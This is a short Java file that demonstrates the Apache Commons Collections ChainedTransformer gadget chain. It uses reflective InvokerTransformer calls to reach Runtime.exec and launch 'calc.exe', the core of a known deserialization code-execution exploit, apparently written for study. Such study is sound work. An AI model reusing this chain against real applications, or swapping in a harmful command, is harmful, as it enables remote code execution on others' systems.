package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class ChainedTransformerTrigger {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, null}),
                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(new Object());
    }
}
